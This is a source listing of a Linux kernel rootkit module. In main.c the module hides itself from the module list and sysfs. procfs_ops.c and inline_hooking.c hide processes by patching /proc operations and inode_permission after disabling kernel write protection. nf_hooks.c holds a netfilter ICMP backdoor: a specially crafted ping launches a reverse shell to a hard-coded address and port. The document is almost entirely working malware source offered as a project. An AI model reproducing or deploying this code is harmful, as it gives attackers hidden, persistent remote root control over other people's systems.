@@ -1,0 +1,737 @@
+Project Path: arc_gmh5225_Rootkit_lbivmqw1
+
+Source Tree:
+
+```txt
+arc_gmh5225_Rootkit_lbivmqw1
+├── Makefile
+├── README.md
+├── err.h
+├── inline_hooking.c
+├── inline_hooking.h
+├── main.c
+├── memory_prot.c
+├── memory_prot.h
+├── nf_hooks.c
+├── nf_hooks.h
+├── procfs_ops.c
+└── procfs_ops.h
+
+```
+
+`Makefile`:
+
+```
+
+KDIR ?= /usr/lib/modules/$(shell uname -r)/build
+
+ccflags-y+= -std=gnu99 -g3 -DZL_DEBUG
+
+obj-m += zl.o 
+zl-objs := main.o nf_hooks.o memory_prot.o procfs_ops.o
+all: modules
+
+modules modules_install clean help:
+	$(MAKE) -C $(KDIR) M=$(PWD) $@
+
+```
+
+`README.md`:
+
+```md
+# rootkit
+```
+
+`err.h`:
+
+```h
+#ifndef _ERR_H
+#define _ERR_H
+
+#include <linux/printk.h>
+
+#ifdef ZL_DEBUG
+#define log_err(fmt, ...) \
+	printk(KERN_INFO pr_fmt(fmt), ##__VA_ARGS__)
+#else
+#define log_err(fmt, ...)
+#endif
+
+#endif
+
+```
+
+`inline_hooking.c`:
+
+```c
+#include <linux/kernel.h>
+#include <linux/spinlock.h>
+#include <linux/fs.h>
+
+#include "procfs_ops.h"
+#include "memory_prot.h"
+#include "err.h"
+
+#define JMP_CODE_SZ 12
+#define JMP_PATCH_OFFSET 2
+
+struct hook
+{
+	void *orig_fn;
+	void *hook_fn;
+	char orig_code[JMP_CODE_SZ];
+	char hijack_code[JMP_CODE_SZ];
+};
+
+extern int inode_permission(struct inode *inode, int mask);
+static struct hook inode_perm_hook;
+
+/*
+ * movabs $address, %rax
+ * jmpq *rax
+ */
+static char jmp_code[JMP_CODE_SZ] = "\x48\xb8\x00\x00\x00\x00"
+				    "\x00\x00\x00\x00\xff\xe0";
+
+// used to avoid race conditions during memcpy of jmp shellcode
+static DEFINE_SPINLOCK(hijack_spinlock);
+
+#define HIJACK_SPIN_LOCK \
+	spin_lock_irqsave(&hijack_spinlock, spin_flags)
+
+#define HIJACK_SPIN_UNLOCK \
+	spin_unlock_irqrestore(&hijack_spinlock, spin_flags)
+
+static void init_hook(struct hook *h, void *orig_fn, void *hook_fn)
+{
+	log_err("orig_fn = 0x%p\n", orig_fn);
+	h->orig_fn = orig_fn;
+	h->hook_fn = hook_fn;
+	memcpy((char*)h->orig_code, orig_fn, JMP_CODE_SZ);
+	memcpy(h->hijack_code, jmp_code, JMP_CODE_SZ);
+	*((unsigned long *)&h->hijack_code[JMP_PATCH_OFFSET]) = (unsigned long)
+								hook_fn;
+}
+
+static void do_hook(struct hook *h)
+{
+	unsigned long spin_flags;
+	HIJACK_SPIN_LOCK;
+	disable_wp();
+	memcpy((char*)h->orig_fn, h->hijack_code, JMP_CODE_SZ);
+	enable_wp();
+	HIJACK_SPIN_UNLOCK;
+}
+
+static void clear_hook(struct hook *h)
+{
+	unsigned long spin_flags;
+	HIJACK_SPIN_LOCK;
+	disable_wp();
+	memcpy((char*)h->orig_fn, h->orig_code, JMP_CODE_SZ);
+	enable_wp();
+	HIJACK_SPIN_UNLOCK;
+}
+
+static int zl_inode_permission(struct inode *inode, int mask)
+{
+	int orig_ret;
+	unsigned long spin_flags;
+	struct hook *h = &inode_perm_hook;
+	if (!inode)
+		goto call_original;
+	if (is_inode_hidden(inode))
+		return -ENOENT;
+call_original:
+	HIJACK_SPIN_LOCK;
+	disable_wp();
+	memcpy((char*)h->orig_fn, h->orig_code, JMP_CODE_SZ);
+	orig_ret = ((int (*)(struct inode *, int))h->orig_fn)(inode, mask);
+	memcpy((char*)h->orig_fn, h->hijack_code, JMP_CODE_SZ);
+	enable_wp();
+	HIJACK_SPIN_UNLOCK;
+	return orig_ret;
+}
+
+void hook_inode_permission(void)
+{
+	init_hook(&inode_perm_hook, inode_permission, zl_inode_permission);
+	do_hook(&inode_perm_hook);
+}
+
+void unhook_inode_permission(void)
+{
+	clear_hook(&inode_perm_hook);
+}
+
+```
+
+`inline_hooking.h`:
+
+```h
+#ifndef _INLINE_HOOK_H
+#define _INLINE_HOOK_H
+
+void hook_inode_permission(void);
+void unhook_inode_permission(void);
+
+#endif
+
+```
+
+`main.c`:
+
+```c
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/list.h>
+#include <linux/kobject.h>
+
+#include "err.h"
+#include "nf_hooks.h"
+#include "memory_prot.h"
+#include "procfs_ops.h"
+
+MODULE_AUTHOR("zionlion");
+MODULE_LICENSE("GPL");
+MODULE_DESCRIPTION("fun & profit");
+
+static bool is_module_hidden = false;
+static void hide_module(void)
+{
+	if (is_module_hidden) {
+		log_err("Module is already hiddden\n");
+		return;
+	}
+	list_del_init(&(THIS_MODULE->list));
+	/* unlink kobject from sysfs without freeing memory */
+	kobject_del(&(THIS_MODULE->mkobj.kobj));
+	list_del_init(&(THIS_MODULE->mkobj.kobj.entry));
+}
+
+#define TEST_PID "6403"
+
+static int __init zl_init(void)
+{
+	log_err("Module loaded\n");
+#ifdef FINISHED
+	hide_module();
+	if (register_backdoor(DEFAULT_IP, DEFAULT_PORT, DEFAULT_RSHELL_PATH))
+		log_err("Problem registering backdoor\n");
+#endif
+	if (!init_procfs()) {
+		log_err("procfs problem\n");
+		return 0;
+	}
+	if (!hide_pid(TEST_PID))
+		log_err("error hiding pid\n");
+	return 0;
+}
+
+static void __exit zl_exit(void)
+{
+	//unregister_backdoor();
+	if (!unhide_pid(TEST_PID))
+		log_err("error unhiding pid\n");
+	cleanup_procfs();
+	log_err("Unloading module\n");
+}
+
+module_init(zl_init);
+module_exit(zl_exit);
+
+```
+
+`memory_prot.c`:
+
+```c
+#include <linux/mm.h>
+#include "memory_prot.h"
+#include "err.h"
+
+void set_page_ro(void *addr)
+{
+	unsigned int l;
+	/* lookup page table entry for a given virtual address */
+	pte_t *pte = lookup_address((unsigned long)addr, &l);
+	if (pte_write(*pte))
+		pte_wrprotect(*pte);
+	else
+		log_err("pte is already read-only\n");
+}
+
+void set_page_wr(void *addr)
+{
+	unsigned int l;
+	pte_t *pte = lookup_address((unsigned long)addr, &l);
+	if (!pte_write(*pte))
+		pte_mkwrite(*pte);
+	else
+		log_err("pte is already writable\n");
+}
+
+```
+
+`memory_prot.h`:
+
+```h
+#ifndef _PAGE_PROT_H
+#define _PAGE_PROT_H
+
+#include <asm/special_insns.h>
+#include <asm/processor-flags.h>
+#include <linux/preempt.h>
+
+void set_page_ro(void *addr);
+void set_page_rw(void *addr);
+
+static inline void disable_wp(void)
+{
+	unsigned long cr0;
+	preempt_disable();
+	cr0 = read_cr0();
+	cr0 ^= X86_CR0_WP;
+	write_cr0(cr0);
+}
+
+static inline void enable_wp(void)
+{
+	unsigned long cr0;
+	cr0 = read_cr0();
+	cr0 ^= X86_CR0_WP;
+	write_cr0(cr0);
+	barrier();
+	preempt_enable();
+}
+#endif
+
+```
+
+`nf_hooks.c`:
+
+```c
+#include <linux/kernel.h>
+#include <linux/kmod.h>
+#include <linux/in.h>
+#include <linux/ip.h>
+#include <linux/icmp.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+#include <linux/skbuff.h>
+#include <linux/byteorder/generic.h>
+
+#include "err.h"
+#include "nf_hooks.h"
+
+
+/* Remote ip/port for reverse shell */
+static const char *r_ip = DEFAULT_IP;
+static const char *r_port = DEFAULT_PORT;
+/* Path to shell binary */
+static const char *helper_path = DEFAULT_RSHELL_PATH;
+
+static struct nf_hook_ops icmp_hook;
+
+static inline void set_remote_ip(const char *ip)
+{
+	r_ip = ip;
+}
+
+static inline void set_remote_port(const char *port)
+{
+	r_port = port;
+}
+
+static inline void set_helper_path(const char *path)
+{
+	helper_path = path;
+}
+
+static int reverse_shell(const char *shell,
+			 const char *ip,
+			 const char *port)
+{
+	int ret;
+	static char *envp[] = {
+		"HOME=/",
+		"TERM=linux",
+		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
+		NULL
+	};
+	static char *args[4];
+	args[0] = (char *)shell;
+	args[1] = (char *)ip;
+	args[2] = (char *)port;
+	args[3] = NULL;
+	ret = call_usermodehelper(args[0], args, envp, UMH_NO_WAIT);
+	return ret;
+}
+
+static unsigned int icmp_hookfn(void *priv,
+				struct sk_buff *skb,
+				const struct nf_hook_state *state)
+{
+	struct iphdr *iphdr;
+	struct icmphdr *icmphdr;
+	if (!skb) return NF_ACCEPT;
+	iphdr = (struct iphdr *)skb_network_header(skb);
+	if (!iphdr) {
+		log_err("cannot retrieve ip hdr\n");
+		return NF_ACCEPT;
+	}
+	if (iphdr->protocol != IPPROTO_ICMP)
+		return NF_ACCEPT;
+	icmphdr = (struct icmphdr *)skb_transport_header(skb);
+	if (!icmphdr) {
+		log_err("cannot retrieve icmp hdr\n");
+		return NF_ACCEPT;
+	}
+	if (icmphdr->type == ICMP_ECHOREPLY
+	    && icmphdr->code == ICMP_NET_ANO
+	    && ntohs(icmphdr->un.echo.sequence) == 4243) {
+		if (reverse_shell(helper_path, r_ip, r_port))
+			log_err("problem happened dropping shell\n");
+		return NF_DROP;
+	}
+	return NF_ACCEPT;
+}
+
+int register_backdoor(const char *ip, const char *port, const char *shell)
+{
+	icmp_hook.hook = icmp_hookfn;
+	icmp_hook.pf = PF_INET;
+	icmp_hook.hooknum = NF_INET_PRE_ROUTING;
+	icmp_hook.priority = NF_IP_PRI_FIRST;
+	if (ip)
+		set_remote_ip(ip);
+	if (port)
+		set_remote_port(port);
+	if (shell)
+		set_helper_path(shell);
+	return nf_register_hook(&icmp_hook);
+}
+
+void unregister_backdoor(void)
+{
+	nf_unregister_hook(&icmp_hook);
+}
+
+```
+
+`nf_hooks.h`:
+
+```h
+#ifndef _NF_H
+#define _NF_H
+
+#define DEFAULT_IP "192.168.103.109"
+#define DEFAULT_PORT "1337"
+#define DEFAULT_RSHELL_PATH "/tmp/.shell"
+
+int register_backdoor(const char *ip, const char *port,
+		      const char *shell_path);
+void unregister_backdoor(void);
+
+#endif
+
+```
+
+`procfs_ops.c`:
+
+```c
+#include <linux/fs.h>
+#include <linux/proc_fs.h>
+#include <linux/proc_ns.h>
+#include <linux/string.h>
+#include <linux/slab.h>
+#include <linux/list.h>
+#include <linux/namei.h>
+#include <linux/kernel.h>
+#include <linux/sched.h>
+
+#include "err.h"
+#include "procfs_ops.h"
+#include "memory_prot.h"
+#include "inline_hooking.h"
+
+#define MAX_PID_LENGTH  8
+
+typedef int (*getattr_t)(const struct path *, struct kstat *kstat,
+			 u32 mask, unsigned flag);
+
+//TODO add lock
+struct hidden_pid
+{
+	char pid[MAX_PID_LENGTH];
+	struct inode_operations *i_op;
+	struct file_operations *i_fop;
+	struct inode *inode;
+	struct list_head list;
+};
+
+/* Hidden pids linked list */
+LIST_HEAD(hidden_pids);
+
+/* original function pointers */
+static filldir_t proc_orig_filldir;
+static getattr_t orig_getattr;
+static int (*orig_open)(struct inode *i, struct file *f);
+static int (*proc_orig_iterate)(struct file *, struct dir_context *);
+static int (*proc_orig_iterate_shared)(struct file *, struct dir_context *);
+
+
+static struct file_operations *proc_orig_fops;
+static struct proc_dir_entry *proc_root;
+static struct proc_dir_entry *dummy;
+static struct file_operations dummy_fops =
+{
+	.owner = THIS_MODULE
+};
+
+
+static struct inode *proc_find_inode(const char *name)
+{
+	struct path path;
+	int err = kern_path(name, LOOKUP_FOLLOW, &path);
+	if (err) {
+		log_err("couldn't find path : %s\n", name);
+		return NULL;
+	}
+	return path.dentry->d_inode;
+
+}
+
+static bool is_pid_hidden(const char *pid)
+{
+	struct hidden_pid *hpid;
+	if (!pid)
+		return false;
+	if (list_empty(&hidden_pids))
+		return false;
+	list_for_each_entry(hpid, &hidden_pids, list) {
+		if (!strncmp(hpid->pid, pid, MAX_PID_LENGTH))
+			return true;
+	}
+	return false;
+}
+
+bool is_inode_hidden(const struct inode *inode)
+{
+	struct hidden_pid *hpid;
+	if (!inode || list_empty(&hidden_pids))
+		return false;
+	list_for_each_entry(hpid, &hidden_pids, list) {
+		if (hpid->inode == inode)
+			return true;
+	}
+	return false;
+}
+
+static int zl_getattr(const struct path *path, struct kstat *kstat,
+		      u32 mask, unsigned int flags)
+{
+	if (!path)
+		goto orig;
+	if (!path->dentry)
+		goto orig;
+	if (is_pid_hidden(path->dentry->d_name.name))
+		return -ENOENT;
+orig:
+	return orig_getattr(path, kstat, mask, flags);
+}
+
+static int zl_open(struct inode *i, struct file *f)
+{
+	if (!f)
+		goto orig;
+	if (!f->f_path.dentry)
+		goto orig;
+	if (!f->f_path.dentry->d_name.name)
+		goto orig;
+	if (is_pid_hidden(f->f_path.dentry->d_name.name))
+		return -ENOENT;
+orig:
+	if (!orig_open)
+		return -1;
+	return orig_open(i, f);
+}
+
+/* Add the given pid to the hidden pids list.
+ * This list is used in filldir to check if a pid is hidden
+ */
+bool hide_pid(const char *pid)
+{
+	struct hidden_pid *hpid;
+	struct inode *pid_inode;
+	char proc_pid_path[256];
+	if (!pid)
+		return false;
+	if (is_pid_hidden(pid)) {
+		log_err("pid %s in already hidden\n", pid);
+		return false;
+	}
+	hpid = kmalloc(sizeof(struct hidden_pid), GFP_KERNEL);
+	if (!hpid) {
+		log_err("kmalloc failed to alloc hidden_pid\n");
+		return false;
+	}
+	if (snprintf(proc_pid_path, 255, "/proc/%s/", pid) < 0) {
+		log_err("snprintf error\n");
+		goto free_err;
+	}
+	pid_inode = proc_find_inode(proc_pid_path);
+	if (!pid_inode) {
+		log_err("cannot retrieve inode for pid %s\n", pid);
+		goto free_err;
+	}
+	hpid->i_op = (void*)pid_inode->i_op;
+	hpid->i_fop = (void*)pid_inode->i_fop;
+	hpid->inode = pid_inode;
+	orig_getattr = (void*)pid_inode->i_op->getattr;
+	orig_open = (void*)pid_inode->i_fop->open;
+	disable_wp();
+	*((unsigned long **)&pid_inode->i_op->getattr) = (void*)zl_getattr;
+	*((unsigned long **)&pid_inode->i_fop->open) = (void *)zl_open;
+	enable_wp();
+	strncpy(hpid->pid, pid, MAX_PID_LENGTH);
+	INIT_LIST_HEAD(&hpid->list);
+	list_add_tail(&hpid->list, &hidden_pids);
+	return true;
+free_err:
+	kfree(hpid);
+	return false;
+}
+
+/* You might need to unhide the pid to kill the process */
+bool unhide_pid(const char *pid)
+{
+	struct hidden_pid *hpid;
+	if (!pid)
+		return false;
+	if (!is_pid_hidden(pid)) {
+		log_err("pid %s isn't hidden\n", pid);
+		return false;
+	}
+	list_for_each_entry(hpid, &hidden_pids, list) {
+		if (!strncmp(hpid->pid, pid, MAX_PID_LENGTH))
+			break;
+	}
+	if(strncmp(hpid->pid, pid, MAX_PID_LENGTH))
+		return false;
+	disable_wp();
+	hpid->i_fop->open = orig_open;
+	hpid->i_op->getattr = orig_getattr;
+	enable_wp();
+	list_del(&hpid->list);
+	kfree(hpid);
+	return true;
+}
+
+static int proc_zl_filldir(struct dir_context *ctx, const char *name,
+		           int namelen, loff_t off, u64 ino, unsigned d_type)
+{
+	if (is_pid_hidden(name))
+		return 0;
+	return proc_orig_filldir(ctx, name, namelen, off, ino, d_type);
+}
+
+static int proc_zl_iterate(struct file *file, struct dir_context *ctx)
+{
+	int err;
+	proc_orig_filldir = ctx->actor;
+	*((filldir_t*)&ctx->actor) = proc_zl_filldir;
+	if (proc_orig_iterate)
+		err = proc_orig_iterate(file, ctx);
+	else if (proc_orig_iterate_shared)
+		err = proc_orig_iterate_shared(file, ctx);
+	else {
+		log_err("proc_orig_iterate_* are null\n");
+		*((filldir_t*)&ctx->actor) = proc_orig_filldir;
+		return 0;
+	}
+	*((filldir_t*)&ctx->actor) = proc_orig_filldir;
+	return err;
+}
+
+
+/*
+ * replace /proc/ iterate function to hide pids in hidden_pids list
+ *
+ * return wether init worked or failed
+ */
+bool init_procfs(void)
+{
+	dummy = proc_create("dummy", S_IFREG | S_IRUGO, NULL, &dummy_fops);
+	if (!dummy) {
+		log_err("Cannot create entry in procfs\n");
+		remove_proc_entry("dummy", NULL);
+		return false;
+	}
+	proc_root = dummy->parent;
+	remove_proc_entry("dummy", NULL);
+	if (strcmp(proc_root->name, "/proc")) {
+		log_err("Cannot retrieve proc_root\n");
+		return false;
+	}
+	proc_orig_fops = (struct file_operations *)proc_root->proc_fops;
+	proc_orig_iterate = proc_orig_fops->iterate;
+	proc_orig_iterate_shared = proc_orig_fops->iterate_shared;
+	disable_wp();
+	proc_orig_fops->iterate = proc_zl_iterate;
+	proc_orig_fops->iterate_shared = proc_zl_iterate;
+	enable_wp();
+	hook_inode_permission();
+	return true;
+}
+
+void cleanup_procfs(void)
+{
+	if (!proc_orig_fops)
+		return;
+	disable_wp();
+	proc_orig_fops->iterate = proc_orig_iterate;
+	proc_orig_fops->iterate_shared = proc_orig_iterate_shared;
+	enable_wp();
+	unhook_inode_permission();
+}
+
+```
+
+`procfs_ops.h`:
+
+```h
+#ifndef _PROCFS_OPS_H
+#define _PROCFS_OPS_H
+
+struct proc_dir_entry {
+	unsigned int low_ino;
+	umode_t mode;
+	nlink_t nlink;
+	kuid_t uid;
+	kgid_t gid;
+	loff_t size;
+	const struct inode_operations *proc_iops;
+	const struct file_operations *proc_fops;
+	struct proc_dir_entry *parent;
+	struct rb_root subdir;
+	struct rb_node subdir_node;
+	void *data;
+	atomic_t count;		/* use count */
+	atomic_t in_use;	/* number of callers into module in progress; */
+			/* negative -> it's going away RSN */
+	struct completion *pde_unload_completion;
+	struct list_head pde_openers;	/* who did ->open, but not ->release */
+	spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
+	u8 namelen;
+	char name[];
+};
+bool hide_pid(const char *pid);
+bool unhide_pid(const char *pid);
+
+bool init_procfs(void);
+void cleanup_procfs(void);
+
+bool is_inode_hidden(const struct inode *inode);
+#endif
+
+```
